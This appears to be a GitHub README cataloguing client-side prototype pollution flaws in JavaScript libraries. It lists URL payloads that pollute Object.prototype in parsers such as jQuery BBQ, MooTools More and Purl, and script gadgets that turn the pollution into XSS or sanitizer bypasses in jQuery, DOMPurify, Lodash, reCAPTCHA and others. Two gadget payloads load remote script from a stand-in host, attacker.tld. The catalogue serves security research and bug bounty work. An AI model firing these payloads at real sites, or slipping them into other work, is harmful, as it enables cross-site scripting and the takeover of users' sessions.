# Client-Side Prototype Pollution

## Intro

If you are unfamiliar with Prototype Pollution Attack, you should read the following first:  
[JavaScript prototype pollution attack in NodeJS](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf) by Olivier Arteau  
[Prototype pollution – and bypassing client-side HTML sanitizers](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/) by Michał Bentkowski

In this repository, I am trying to collect examples of libraries that are vulnerable to Prototype Pollution due to `document.location` parsing and useful script gadgets that can be used to demonstrate the impact.

## Prototype Pollution

| Name                                                              | Payload                                                                  | Refs                                        | Found by                                         |
|-------------------------------------------------------------------|--------------------------------------------------------------------------|---------------------------------------------|--------------------------------------------------|
| Wistia Embedded Video (**Fixed**)                                 | `?__proto__[test]=test`<br>`?__proto__.test=test`                        | [[1]](https://hackerone.com/reports/986386) | [William Bowling](https://twitter.com/wcbowling) |
| [jQuery query-object plugin](/pp/jquery-query-object.md)          | `?__proto__[test]=test`<br>`#__proto__[test]=test`                       |                                             | [Sergey Bobrov](https://twitter.com/Black2Fan)   |
| [jQuery Sparkle](/pp/jquery-sparkle.md)                           | `?__proto__.test=test`<br>`?constructor.prototype.test=test`             |                                             | [Sergey Bobrov](https://twitter.com/Black2Fan)   |
| [V4Fire Core Library](/pp/v4fire-core.md)                         | `?__proto__.test=test`<br>`?__proto__[test]=test`<br>`?__proto__[test]={"json":"value"}`|                              | [Sergey Bobrov](https://twitter.com/Black2Fan)   |
| [backbone-query-parameters](/pp/backbone-qp.md)                   | `?__proto__.test=test`<br>`?constructor.prototype.test=test`<br>`?__proto__.array=1\|2\|3`| [[1]](https://bugcrowd.com/disclosures/57b28008-4653-4dec-88c3-4d38e40023ff/toolbox-teslamotors-com-html-injection-via-prototype-pollution-potential-xss) | [Sergey Bobrov](https://twitter.com/Black2Fan)   |
| [jQuery BBQ](/pp/jquery-bbq.md)                                   | `?__proto__[test]=test`<br>`?constructor[prototype][test]=test`          |                                             | [Sergey Bobrov](https://twitter.com/Black2Fan)   |
| [jquery-deparam](/pp/jquery-deparam.md)                           | `?__proto__[test]=test`<br>`?constructor[prototype][test]=test`          |                                             | [Sergey Bobrov](https://twitter.com/Black2Fan)   |
| [MooTools More](/pp/mootools-more.md)                             | `?__proto__[test]=test`<br>`?constructor[prototype][test]=test`          |                                             | [Sergey Bobrov](https://twitter.com/Black2Fan)   |
| [Swiftype Site Search (**Fixed**)](/pp/swiftype-site-search.md)   | `#__proto__[test]=test`                                                  |                                             | [s1r1us](https://twitter.com/S1r1u5_)            |
| [CanJS deparam](/pp/canjs-deparam.md)                             | `?__proto__[test]=test`<br>`?constructor[prototype][test]=test`          |                                             | [Rahul Maini](https://twitter.com/iamnoooob)     |
| [Purl (jQuery-URL-Parser)](/pp/purl.md)                           | `?__proto__[test]=test`<br>`?constructor[prototype][test]=test`<br>`#__proto__[test]=test`|                            | [Sergey Bobrov](https://twitter.com/Black2Fan)   |
| [HubSpot Tracking Code (**Fixed**)](/pp/hubspot.md)               | `?__proto__[test]=test`<br>`?constructor[prototype][test]=test`<br>`#__proto__[test]=test`|                            | [Sergey Bobrov](https://twitter.com/Black2Fan)   |

## Script Gadgets

| Name                                                    | Payload                                                                       | Impact            | Refs                                              | Found by                                            |
|---------------------------------------------------------|-------------------------------------------------------------------------------|-------------------|---------------------------------------------------|-----------------------------------------------------|
| [Wistia Embedded Video](/gadgets/wistia-video.md)       | `?__proto__[innerHTML]=<img/src/onerror=alert(1)>`                            | XSS               | [[1]](https://hackerone.com/reports/986386)       | [William Bowling](https://twitter.com/wcbowling)    |
| [jQuery $.get >= 3.0.0](/gadgets/jquery.md)             | `?__proto__[url][]=data:,alert(1)//&__proto__[dataType]=script`               | XSS               |                                                   | [Michał Bentkowski](https://twitter.com/SecurityMB) |
| [jQuery $.getScript >= 3.4.0](/gadgets/jquery.md)       | `?__proto__[src][]=data:,alert(1)//`                                          | XSS               |                                                   | [s1r1us](https://twitter.com/S1r1u5_)               |
| [jQuery $.getScript 3.0.0 - 3.3.1](/gadgets/jquery.md)  | `?__proto__[url]=data:,alert(1)//`                                            | XSS               |                                                   | [s1r1us](https://twitter.com/S1r1u5_)               |
| [jQuery $(html)](/gadgets/jquery.md)                    | `?__proto__[div][0]=1&__proto__[div][1]=<img/src/onerror%3dalert(1)>&__proto__[div][2]=1`| XSS    |                                                   | [Sergey Bobrov](https://twitter.com/Black2Fan)      |
| [jQuery $(x).off](/gadgets/jquery.md)                   | `?__proto__[preventDefault]=x&__proto__[handleObj]=x&__proto__[delegateTarget]=<img/src/onerror%3dalert(1)>`| XSS    |                                | [Sergey Bobrov](https://twitter.com/Black2Fan)      |
| [Google reCAPTCHA](/gadgets/recaptcha.md)               | `?__proto__[srcdoc][]=<script>alert(1)</script>`                              | XSS               |                                                   | [s1r1us](https://twitter.com/S1r1u5_)               |
| [Twitter Universal Website Tag](/gadgets/twitter-uwt.md)| `?__proto__[hif][]=javascript:alert(1)`                                       | XSS               |                                                   | [Sergey Bobrov](https://twitter.com/Black2Fan)      |
| [Tealium Universal Tag](/gadgets/tealium-utag.md)       | `?__proto__[attrs][src]=1&__proto__[src]=//attacker.tld/js.js`                | XSS               |                                                   | [Sergey Bobrov](https://twitter.com/Black2Fan)      |
| [Akamai Boomerang](/gadgets/akamai-boomerang.md)        | `?__proto__[BOOMR]=1&__proto__[url]=//attacker.tld/js.js`                     | XSS               |                                                   | [s1r1us](https://twitter.com/S1r1u5_)               |
| [Lodash <= 4.17.15](/gadgets/lodash.md)                 | `?__proto__[sourceURL]=%E2%80%A8%E2%80%A9alert(1)`                            | XSS               | [[1]](https://github.com/lodash/lodash/pull/4518) | [Alex Brasetvik](https://twitter.com/alexbrasetvik) |
| [sanitize-html](/gadgets/sanitize-html.md)              | `?__proto__[*][]=onload`                                                      | Bypass            | [[1]](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/) | [Michał Bentkowski](https://twitter.com/SecurityMB) |
| [sanitize-html](/gadgets/sanitize-html.md)              | `?__proto__[innerText]=<script>alert(1)</script>`                             | Bypass            | [[1]](https://github.com/apostrophecms/sanitize-html/commit/0fe551c2c6fac1277c0b9688263bd61acc52baf8)| [Hpdoger](https://twitter.com/hpdoger)              |
| [js-xss](/gadgets/js-xss.md)                            | `?__proto__[whiteList][img][0]=onerror&__proto__[whiteList][img][1]=src`      | Bypass            | [[1]](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/) | [Michał Bentkowski](https://twitter.com/SecurityMB) |
| [DOMPurify <= 2.0.12](/gadgets/dompurify.md)            | `?__proto__[ALLOWED_ATTR][0]=onerror&__proto__[ALLOWED_ATTR][1]=src`          | Bypass            | [[1]](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/) | [Michał Bentkowski](https://twitter.com/SecurityMB) |
| [DOMPurify <= 2.0.12](/gadgets/dompurify.md)            | `?__proto__[documentMode]=9`                                                  | Bypass            | [[1]](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/) | [Michał Bentkowski](https://twitter.com/SecurityMB) |
| [Closure](/gadgets/closure.md)                          | `?__proto__[*%20ONERROR]=1&__proto__[*%20SRC]=1`                              | Bypass            | [[1]](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/) | [Michał Bentkowski](https://twitter.com/SecurityMB) |
| [Closure](/gadgets/closure.md)                          | `?__proto__[CLOSURE_BASE_PATH]=data:,alert(1)//`                              | XSS               | [[1]](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/) | [Michał Bentkowski](https://twitter.com/SecurityMB) |
| [Marionette.js / Backbone.js](/gadgets/marionette.md)   | `?__proto__[tagName]=img&__proto__[src][]=x:&__proto__[onerror][]=alert(1)`   | XSS               |                                                   | [Sergey Bobrov](https://twitter.com/Black2Fan)      |
| [Adobe Dynamic Tag Management](/gadgets/adobe-dtm.md)   | `?__proto__[src]=data:,alert(1)//`                                            | XSS               |                                                   | [Sergey Bobrov](https://twitter.com/Black2Fan)      |
| [Swiftype Site Search](/gadgets/swiftype-site-search.md)| `?__proto__[xxx]=alert(1)`                                                    | XSS               |                                                   | [s1r1us](https://twitter.com/S1r1u5_)               |
| [Embedly Cards](/gadgets/embedly.md)                    | `?__proto__[onload]=alert(1)`                                                 | XSS               |                                                   | [Guilherme Keerok](https://twitter.com/k33r0k)      |
| [Segment Analytics.js](/gadgets/segment-analytics.md)   | `?__proto__[script][0]=1&__proto__[script][1]=<img/src/onerror%3dalert(1)>&__proto__[script][2]=1`| XSS               |                               | [Sergey Bobrov](https://twitter.com/Black2Fan)      |
| [Knockout.js](/gadgets/knockout.md)                     | `?__proto__[4]=a':1,[alert(1)]:1,'b&__proto__[5]=,`                           | XSS               |                                                   | [Michał Bentkowski](https://twitter.com/SecurityMB) |
| [Zepto.js](/gadgets/zepto.md)                           | `?__proto__[onerror]=alert(1)`                                                | XSS               | [[1]](https://xz.aliyun.com/t/8552)               | [lih3iu](https://twitter.com/lih3iu)                |
| [Sprint.js](/gadgets/sprint.md)                         | `?__proto__[div][intro]=<img%20src%20onerror%3dalert(1)>`                     | XSS               | [[1]](https://xz.aliyun.com/t/8552)               | [lih3iu](https://twitter.com/lih3iu)                |